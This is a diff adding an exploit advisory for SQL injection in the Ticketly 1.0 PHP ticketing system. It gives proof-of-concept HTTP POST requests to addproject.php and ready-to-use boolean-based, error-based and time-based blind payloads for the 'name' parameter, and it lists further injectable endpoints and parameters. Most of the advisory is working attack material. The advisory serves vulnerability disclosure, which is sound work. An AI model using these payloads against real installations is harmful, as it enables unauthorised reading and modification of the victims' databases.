@@ -1,0 +1,70 @@
+# Exploit Title: Ticketly 1.0 – 'name' SQL Injection
+# Exploit Author: Javier Olmedo
+# Website: https://hackpuntes.com
+# Date: 2018-11-19
+# Google Dork: N/A
+# Vendor: Abisoft (https://abisoftgt.net)
+# Software Link: https://abisoftgt.net/software/6/sistema-de-tickets-y-soporte-con-php-y-mysql
+# Affected Version: 1.0
+# Patched Version: unpatched
+# Category: Web Application
+# Platform: Windows & Ubuntu
+# Tested on: Win10x64 & Kali Linux
+# 6. References:
+# https://hackpuntes.com/cve-2018-18923-ticketly-1-0-multiples-sql-injections/
+# CVE: N/A
+
+# 1. Technical Description:
+# Ticketly 1.0 are affected by SQL Injection in multiple parameters and
+# resources through POST. This allows a attacker to read and modify
+# sensitive information from the database used by the application.
+
+# 2. Proof Of Concept (PoC):
+# 2.1 The following POST request generates an error 500 in the Application (add ' in name parameter)
+---
+POST /ticketly/action/addproject.php HTTP/1.1
+Host: localhost
+User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:50.0) Gecko/20100101 Firefox/50.0
+Accept: */*
+Accept-Language: es-ES,es;q=0.8,en-US;q=0.5,en;q=0.3
+Accept-Encoding: gzip, deflate
+Referer: http://localhost/ticketly/projects.php
+Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+X-Requested-With: XMLHttpRequest
+Content-Length: 32
+Connection: close
+
+name=Test%22&description=Test
+---
+
+# 2.2 In another request, add two ' to receive a code 200 OK
+---
+POST /ticketly/action/addproject.php HTTP/1.1
+Host: localhost
+User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:50.0) Gecko/20100101 Firefox/50.0
+Accept: */*
+Accept-Language: es-ES,es;q=0.8,en-US;q=0.5,en;q=0.3
+Accept-Encoding: gzip, deflate
+Referer: http://localhost/ticketly/projects.php
+Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+X-Requested-With: XMLHttpRequest
+Content-Length: 32
+Connection: close
+
+name=Test%22%22&description=Test
+---
+
+# 3. Payloads
+# 3.1 Payload (boolean-based blind)
+name=Test" RLIKE (SELECT (CASE WHEN (4632=4632) THEN 0x54657374 ELSE 0x28 END)) AND "lrmZ"="lrmZ&description=Test
+
+# 3.2 Payload (error-based)
+name=Test” AND EXTRACTVALUE(9139,CONCAT(0x5c,0x7176766a71,(SELECT (ELT(9139=9139,1))),0x7178717a71)) AND "SZJL"="SZJL&description=Test
+
+#3.3 Payload (AND/OR time-based blind)
+name=Test” RLIKE SLEEP(5) AND "WkTS"="WkTS&description=Test
+
+# 4. Vulnerables resources and parameters
+# /action/addproject.php (description, name, category_id and description)
+# /action/addticket.php (king_id, priority_id, project_id, status_id and title)
+# /reports.php (kind_id y status_id)
